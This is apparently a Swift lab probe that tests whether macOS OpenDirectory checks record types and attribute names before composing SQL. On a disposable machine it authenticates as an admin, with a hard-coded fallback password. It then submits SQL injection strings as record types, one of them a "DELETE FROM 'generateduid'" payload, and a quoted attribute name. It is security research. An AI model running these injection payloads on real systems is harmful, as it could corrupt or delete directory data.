// CAND-018 lab probe: record-type validation vs. PlistFile SQL composition.
// Run on a DISPOSABLE macOS machine (GitHub runner or lab VM) as an authenticated admin.
// Creates records with hostile record types, deletes them, prints every error verbatim.
import Foundation
import OpenDirectory

func p(_ s: String) { FileHandle.standardOutput.write((s + "\n").data(using: .utf8)!) }

let session = ODSession.default()
p("== session ok")

// 1. Authenticate the local node with the disposable admin (set via dscl before running).
let node: ODNode
do { node = try ODNode(session: session!, type: .local) ; p("== node /Local/Default opened") }
catch { p("!! node open failed: \(error)"); exit(1) }

let user = ProcessInfo.processInfo.environment["LAB_USER"] ?? "runner"
let pass = ProcessInfo.processInfo.environment["LAB_PASS"] ?? "LabPass123!"
do {
    try node.setCredentials(withRecordType: .users, recordName: user, password: pass)
    p("== node authenticated as \(user)")
} catch { p("!! node auth failed: \(error) — writes below will likely be denied"); }

// 2. Baseline: create + delete a normally-typed record (proves the write path works at all).
do {
    let r = try node.createRecord(withRecordType: kODRecordTypeUsers, name: "probe_baseline_\(Int(Date().timeIntervalSince1970))", attributes: nil)
    p("== baseline user record created")
    try r.delete()
    p("== baseline user record deleted")
} catch { p("!! baseline create/delete failed: \(error)") }

// 3. The experiment: hostile record types through create + delete.
let hostileTypes = [
    "Probe'Type",                    // single quote -> breaks recordtype='%s'
    "ProbeType--",                   // SQL comment tail
    "Probe'); DELETE FROM 'generateduid'; --",  // statement-breaking payload
]
for t in hostileTypes {
    p("-- hostile type: \(t)")
    do {
        let r = try node.createRecord(withRecordType: t, name: "probe_h_\(Int(Date().timeIntervalSince1970))", attributes: nil)
        p("   CREATED (type accepted!) -> deleting")
        try r.delete()
        p("   deleted")
    } catch {
        p("   create rejected: \(error)")
    }
}

// 4. Also probe attribute-name influence on the index path: set an attribute with a hostile name.
do {
    let r = try node.createRecord(withRecordType: kODRecordTypeUsers, name: "probe_attr_\(Int(Date().timeIntervalSince1970))", attributes: nil)
    let hostileAttr = "Probe'Attr"
    do {
        try r.setValue("x", forAttribute: hostileAttr)
        p("== hostile ATTRIBUTE name accepted: \(hostileAttr) -> deleting record")
    } catch { p("   hostile attribute rejected: \(error)") }
    try r.delete()
} catch { p("!! attr-probe record create failed: \(error)") }

p("== done — now capture: log show --last 10m --predicate 'process == \"opendirectoryd\"' | grep -E 'sqlite3_prepare|index'")
